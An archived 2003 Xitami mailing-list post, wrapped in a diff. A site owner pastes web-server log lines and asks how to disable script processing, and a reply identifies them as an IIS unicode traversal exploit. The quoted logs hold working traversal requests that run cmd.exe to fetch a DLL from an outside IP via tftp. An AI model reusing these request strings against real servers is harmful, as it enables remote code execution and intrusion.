@@ -1,0 +1,117 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
+<HTML>
+ <HEAD>
+   <TITLE> [Xitami] Security Issue - Disabling Script Processing
+   </TITLE>
+   <LINK REL="Index" HREF="index.html" >
+   <LINK REL="made" HREF="mailto:xitami%40lists.xitami.org">
+   <META NAME="robots" CONTENT="index,nofollow">
+   
+   <LINK REL="Previous"  HREF="004610.html">
+   <LINK REL="Next"  HREF="004613.html">
+ </HEAD>
+ <BODY BGCOLOR="#ffffff">
+   <H1>[Xitami] Security Issue - Disabling Script Processing
+   </H1>
+    <B>TW
+    </B> 
+    <A HREF="mailto:xitami%40lists.xitami.org"
+       TITLE="[Xitami] Security Issue - Disabling Script Processing">xitami@lists.xitami.org
+       </A><BR>
+    <I>Tue, 14 Jan 2003 19:48:32 +0100</I>
+    <P><UL>
+        <LI> Previous message: <A HREF="004610.html">[Xitami] Security Issue - Disabling Script Processing
+</A></li>
+        <LI> Next message: <A HREF="004613.html">[Xitami] Security Issue - Disabling Script Processing
+</A></li>
+         <LI> <B>Messages sorted by:</B> 
+              <a href="date.html#4612">[ date ]</a>
+              <a href="thread.html#4612">[ thread ]</a>
+              <a href="subject.html#4612">[ subject ]</a>
+              <a href="author.html#4612">[ author ]</a>
+         </LI>
+       </UL>
+    <HR>  
+<!--beginarticle-->
+<PRE>I am way sure, that this is the wrong list. You most probably sent us a 
+log-file excerpt created by IIS. What you see is a typical IIS exploit, 
+based on the fact that IIS interprets unicode wrong.
+
+This is a Xitami list. Xitami is not affected by it and returns four-o-four.
+
+Tony
+
+At 10:40 14.01.2003 -0700, you wrote:
+&gt;<i>Hi,
+</I>&gt;<i>
+</I>&gt;<i>Please forgive me if I have not sent this correctly to the group.
+</I>&gt;<i>
+</I>&gt;<i>Can somebody help me with this.
+</I>&gt;<i>
+</I>&gt;<i>Periodically, I see in the access logs and error logs, an attempt from a
+</I>&gt;<i>hacker to run certain types of scripts in a cmd window such as the
+</I>&gt;<i>following:
+</I>&gt;<i>
+</I>&gt;<i>&quot;GET
+</I>&gt;<i>/scripts/..%%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%20208.179.58.54%20G
+</I>&gt;<i>ET%20cool.dll%20c:\httpodbc.dll HTTP/1.0&quot; 200 -1 &quot;&quot; &quot;&quot;
+</I>&gt;<i>&quot;GET
+</I>&gt;<i>/scripts/..%%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%20208.179.58.54%20G
+</I>&gt;<i>ET%20cool.dll%20d:\httpodbc.dll HTTP/1.0&quot; 200 -1 &quot;&quot; &quot;&quot;
+</I>&gt;<i>&quot;GET
+</I>&gt;<i>/scripts/..%%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%20208.179.58.54%20G
+</I>&gt;<i>ET%20cool.dll%20e:\httpodbc.dll HTTP/1.0&quot; 200 -1 &quot;&quot; &quot;&quot;
+</I>&gt;<i>&quot;GET /scripts/..%%35%63../httpodbc.dll HTTP/1.0&quot; 200 -1 &quot;&quot; &quot;&quot;
+</I>&gt;<i>&quot;GET /scripts/..%%35c../winnt/system32/cmd.exe?/c+dir HTTP/1.0&quot; 200 -1 &quot;&quot; &quot;&quot;
+</I>&gt;<i>&quot;GET
+</I>&gt;<i>/scripts/..%%35c../winnt/system32/cmd.exe?/c+tftp%20-i%20208.179.58.54%20GET
+</I>&gt;<i>%20cool.dll%20c:\httpodbc.dll HTTP/1.0&quot; 200 -1 &quot;&quot; &quot;&quot;
+</I>&gt;<i>&quot;GET
+</I>&gt;<i>/scripts/..%%35c../winnt/system32/cmd.exe?/c+tftp%20-i%20208.179.58.54%20GET
+</I>&gt;<i>%20cool.dll%20d:\httpodbc.dll HTTP/1.0&quot; 200 -1 &quot;&quot; &quot;&quot;
+</I>&gt;<i>&quot;GET
+</I>&gt;<i>/scripts/..%%35c../winnt/system32/cmd.exe?/c+tftp%20-i%20208.179.58.54%20GET
+</I>&gt;<i>%20cool.dll%20e:\httpodbc.dll HTTP/1.0&quot; 200 -1 &quot;&quot; &quot;&quot;
+</I>&gt;<i>
+</I>&gt;<i>Notice that the hacker successfully used tftp to send some info back to
+</I>&gt;<i>himself.  My router logs confirmed that this occurred.  I have since
+</I>&gt;<i>eliminated all access rights to tftp.  Not even the admin has rights
+</I>&gt;<i>anymore.  Since this is on a Win2k system, you just can't delete or rename
+</I>&gt;<i>certain system executables such as cmd.exe or tftp.exe.  Windows just
+</I>&gt;<i>restores it automatically.
+</I>&gt;<i>
+</I>&gt;<i>The question is: Since I run a simple HTML only site and don't need CGI
+</I>&gt;<i>processing, what can I do to eliminate all script processing of this nature.
+</I>&gt;<i>
+</I>&gt;<i>PS - The rest of you probably encounter some of these same security issues.
+</I>&gt;<i>You should check.
+</I>&gt;<i>
+</I>&gt;<i>Best Regards,
+</I>&gt;<i>Rob Allen
+</I>&gt;<i>President, Blue Marble Meds LLC.  Offering 30-75% off Prescription Meds
+</I>&gt;<i>See us at <A HREF="http://www.BlueMarbleMeds.com">http://www.BlueMarbleMeds.com</A>
+</I>&gt;<i>
+</I>&gt;<i>
+</I>&gt;<i>
+</I>&gt;<i>--
+</I>&gt;<i>Xitami Users Mailing List -- For Xitami support
+</I>&gt;<i>To unsubscribe: <A HREF="http://lists.xitami.org/mailman/listinfo/xitami">http://lists.xitami.org/mailman/listinfo/xitami</A>
+</I>
+
+</PRE>
+<!--endarticle-->
+    <HR>
+    <P><UL>
+        <!--threads-->
+	<LI> Previous message: <A HREF="004610.html">[Xitami] Security Issue - Disabling Script Processing
+</A></li>
+	<LI> Next message: <A HREF="004613.html">[Xitami] Security Issue - Disabling Script Processing
+</A></li>
+         <LI> <B>Messages sorted by:</B> 
+              <a href="date.html#4612">[ date ]</a>
+              <a href="thread.html#4612">[ thread ]</a>
+              <a href="subject.html#4612">[ subject ]</a>
+              <a href="author.html#4612">[ author ]</a>
+         </LI>
+       </UL>
+</body></html>
